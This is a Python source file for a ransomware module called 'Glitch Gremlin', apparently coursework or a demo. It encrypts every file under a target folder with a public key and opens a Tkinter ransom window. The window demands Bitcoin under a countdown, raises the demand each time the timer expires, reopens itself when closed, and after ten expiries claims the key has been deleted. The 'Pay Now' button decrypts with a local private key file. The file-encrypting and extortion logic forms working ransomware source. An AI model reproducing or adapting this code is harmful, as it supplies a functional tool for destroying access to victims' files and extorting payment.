import tkinter as tk
from tkinter import messagebox
from Encryption import *

class RansomwareModule:
    def __init__(self, id, public_keyfile, root, directory="files"):
        self.id = id
        self.directory = directory
        self.encryption = Encryption(self.id, public_keyfile)
        self.root = root
        self.timer_duration = 100
        self.timer = self.timer_duration
        self.payment_amount = 0.5
        self.payment_counter = 0

        self.encrypt_files() #encrypt files at initialisation
        self.create_popup() #create popup at initialisation


    def create_popup(self):
        """
        a method that creates the popup window of the ransomware
        """
        self.popup = tk.Toplevel(self.root)
        self.popup.title("Glitch Gremlin")
        self.popup.geometry("1000x600")
        self.popup.protocol("WM_DELETE_WINDOW", self.on_close)
        self.popup.config(bg='red')

        #create a frame for the left side 
        left_frame = tk.Frame(self.popup, bg='red')
        left_frame.pack(side="left", padx=10, fill="both")

        #create a frame for the ASCII art with a border
        ascii_frame = tk.Frame(left_frame, bg='black', bd=5, relief="solid")
        ascii_frame.pack(padx=10, pady=5, fill="both", expand=True)

        #payment Amount popup
        self.payment_label = tk.Label(self.popup, text=f"Amount Due: {self.payment_amount}BTC", font=("Arial", 14), fg="white", bg="black")
        self.payment_label.pack(side="top", pady=20)
        
        #Ascii popup widget
        ascii_art = f"""
  
     ___________________________________________________________
    | Please complete your payment within the next {self.timer_duration} seconds. |
    @___________________________________________________________@                   
                       /
                      /           ________________________
             )            (      | Or lose all your files |
            /(   (\\___/)  )\\     @________________________@
           ( #)  \\ \\ / | ( #)  __/
            ||___c\\  > '__||
            ||**** ),_/ **'|     __
     .__    |'* ___| |___*'|       \\   _____________________________________________
       \\_\\  |' (    ~   ,)'|      \\__| Every {self.timer_duration} seconds the payment will increase |
        ((  |' /(.  '  .)\\ |          @_____________________________________________@
         \\\\_|_/ <_ _____> \\______________
          /   '-, \\   / ,-'      ______  \\
         /      (//   \\\\)       / $$$ /   \\
        /______________________/_____/_____\\
                         ________________________________________
                        /                                        \\
                       [   !!!ALL YOUR FILES ARE ENCRYPTED!!!     ]
                        \\________________________________________/
"""
        text_widget = tk.Text(ascii_frame, wrap=tk.WORD, height=25, width=86, font=("Courier", 10), bg="black", fg="white")
        text_widget.insert(tk.END, ascii_art)
        text_widget.config(state=tk.DISABLED)  # Make text read-only
        text_widget.pack(pady=20)
        
        #Ransomware countdown
        self.countdown_label = tk.Label(self.popup, text=f"Time left: {self.timer} seconds", font=("Arial", 16), bg='black', fg="white")
        self.countdown_label.pack(pady=10)

        #payment button
        pay_button = tk.Button(self.popup, text="  [!]  Pay Now  [!]  ", command=self.pay_now, bg="green", fg="white", font=("Arial", 12))
        pay_button.pack(pady=200)

        # Start countdown
        self.update_timer()

    def update_timer(self):
        """
        A method which updates the time
        """
        if self.timer > 0:
            self.countdown_label.config(text=f"Time left: {self.timer} seconds")
            self.timer -= 1
            self.popup.after(1000, self.update_timer)
        else:
            self.timer_expired()

    def pay_now(self):
        """
        a method which is called when the payment is succesful
        """
        print("Payment successful!")
        decryption_key = "private_attacker.pem"
        self.decrypt_files(decryption_key)
        self.popup.destroy()

    def timer_expired(self):
        """
        a method which is called when the timer expiers
        """

        print("[!] Timer expired! increasing ransom...")
        self.payment_counter += 1

        if self.payment_counter >= 10:
            self.popup.destroy()
            messagebox.showwarning("Goodluck", "Encryption key deleted")
            self.create_popup()

        else:
            self.payment_amount += 0.25
            self.payment_label.config(text=f"Amount Due: {self.payment_amount}BTC")
            self.timer = self.timer_duration
            self.update_timer()

    def on_close(self):
        """
        a method which reopens the popup if its closed
        """
        print("Popup closed, reopening...")
        self.popup.destroy()
        self.create_popup()

    def encrypt_files(self):
        """
        a method which encrypts all the files in a folder at the beginning of the ransomware module
        """

        self.encryption.load_public_key()

        for root, dirs, files in os.walk(self.directory):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:  
                        content = f.read()  # Read the file content
                    
                    #encrypt the content
                    encrypted_content = self.encryption.encrypt(content)
                    print(encrypted_content)

                    with open(filepath, "wb") as f:
                        
                        print(encrypted_content)
                        f.write(encrypted_content)

                except Exception as e:
                    print(f"Could not open {filepath}: {e}")

    def decrypt_files(self, private_key_file):
        """
        A method which decrypts the files if th payment was succesful
        """
        #load in the private key
        self.encryption.private_keyfile = private_key_file
        self.encryption.load_private_key()

        for root, dirs, files in os.walk(self.directory):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:  
                        content = f.read()  #read the file content as a binary file
                    
                    #decrypt the content
                    decrypted_content = self.encryption.decrypt(content)

                    
                    if isinstance(decrypted_content, str):
                        decrypted_content = decrypted_content.encode('utf-8')

                    print(decrypted_content)

                    #write it out to the file
                    with open(filepath, "wb") as f:
                        print(decrypted_content)
                        f.write(decrypted_content)

                except Exception as e:
                    print(f"Could not open {filepath}: {e}")



        
    

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()  #Hide the root window

    ransomware = RansomwareModule("1","public_attacker.pem",root) #call the ransomeware class
    
    root.mainloop() # ensures the window stays active

    